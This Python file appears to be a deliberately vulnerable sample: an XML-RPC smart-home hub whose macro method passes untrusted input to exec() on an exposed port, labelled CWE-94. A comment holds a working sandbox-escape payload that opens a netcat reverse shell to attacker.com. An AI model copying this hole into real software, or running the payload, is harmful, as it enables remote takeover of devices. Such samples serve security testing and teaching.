import os
import sqlite3
import logging
from xmlrpc.server import SimpleXMLRPCServer
from xmlrpc.server import SimpleXMLRPCRequestHandler
from datetime import datetime

# Configure logging for the Smart Home RPC Automation Server
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SmartHomeRPC - %(levelname)s - %(message)s'
)
logger = logging.getLogger("SmartHomeRPC")

DB_FILE = "smart_home_state.db"

def init_hub_db():
    """Initializes the SQLite database for IoT devices."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE devices (
            device_id TEXT PRIMARY KEY,
            device_type TEXT NOT NULL,
            current_state TEXT NOT NULL,
            last_updated DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    mock_devices = [
        ('living_room_light', 'bulb', 'OFF'),
        ('front_door_lock', 'lock', 'LOCKED'),
        ('thermostat_1', 'hvac', '72F')
    ]
    cursor.executemany('''
        INSERT INTO devices (device_id, device_type, current_state)
        VALUES (?, ?, ?)
    ''', mock_devices)

    conn.commit()
    conn.close()
    logger.info("Smart Home device database initialized.")

class RequestHandler(SimpleXMLRPCRequestHandler):
    """Restricts XML-RPC paths to a specific endpoint."""
    rpc_paths = ('/RPC2',)

class SmartHomeAutomationAPI:
    """Exposed XML-RPC API methods for the Smart Home Hub."""
    
    def __init__(self):
        self.db_path = DB_FILE

    def get_device_status(self, device_id: str) -> str:
        """Fetches the current state of a registered device."""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT current_state FROM devices WHERE device_id = ?", (device_id,))
            row = cursor.fetchone()
            conn.close()
            if row:
                return row[0]
            return "DEVICE_NOT_FOUND"
        except sqlite3.Error as e:
            logger.error(f"Database error: {e}")
            return "ERROR"

    def update_device_state(self, device_id: str, new_state: str) -> bool:
        """Updates the state of a device (e.g., turning a light on)."""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE devices 
                SET current_state = ?, last_updated = CURRENT_TIMESTAMP 
                WHERE device_id = ?
            ''', (new_state, device_id))
            rows_affected = cursor.rowcount
            conn.commit()
            conn.close()
            return rows_affected > 0
        except sqlite3.Error as e:
            logger.error(f"Database error: {e}")
            return False

    def execute_advanced_macro(self, macro_script: str) -> str:
        """
        VULNERABLE FUNCTION: CWE-94 Improper Control of Generation of Code ('Code Injection')
        Trigger Path: XML-RPC method call -> 'macro_script' string evaluated via exec()
        """
        logger.info("Executing dynamic smart home automation macro...")
        
        # The macro execution context allows the script to interact with the API
        macro_context = {
            "api": self,
            "logger": logger,
            "execution_result": "SUCCESS"
        }
        
        try:
            # Vulnerability: The Smart Home Hub allows power users to submit complex, 
            # conditional automation macros via XML-RPC (e.g., "if time > 8PM turn on lights").
            # The application directly executes this untrusted string as Python code.
            # Because the XML-RPC server is exposed to the local network (or internet), 
            # an attacker can send an XML-RPC payload containing malicious Python code.
            # The exec() function runs this code in the server's process, leading to 
            # Remote Code Execution (RCE) on the Smart Home Hub hardware.
            
            # CWE-94 occurs instantly when the untrusted macro_script is executed.
            exec(macro_script, {"__builtins__": {}}, macro_context)
            
            logger.info("Advanced macro executed successfully.")
            return macro_context.get("execution_result", "SUCCESS")
            
        except Exception as e:
            logger.error(f"Failed to execute macro: {e}")
            return f"MACRO_ERROR: {str(e)}"

def start_rpc_server():
    """Starts the XML-RPC server for the Smart Home Hub."""
    init_hub_db()
    
    server = SimpleXMLRPCServer(("0.0.0.0", 9000), requestHandler=RequestHandler, allow_none=True)
    server.register_introspection_functions()
    
    # Register the API instance to expose its methods
    server.register_instance(SmartHomeAutomationAPI())
    
    # Example Malicious Trigger:
    # 1. Attacker writes a short Python script to interact with the XML-RPC server.
    # 2. The payload contains Python code to break out of the empty __builtins__ dictionary:
    #
    #    import xmlrpc.client
    #    proxy = xmlrpc.client.ServerProxy("http://127.0.0.1:9000/RPC2")
    #    malicious_code = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('nc -e /bin/sh attacker.com 4444')"
    #    print(proxy.execute_advanced_macro(malicious_code))
    
    logger.info("Starting Smart Home XML-RPC Automation Server on http://0.0.0.0:9000")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Shutting down Smart Home Hub...")

if __name__ == "__main__":
    start_rpc_server()
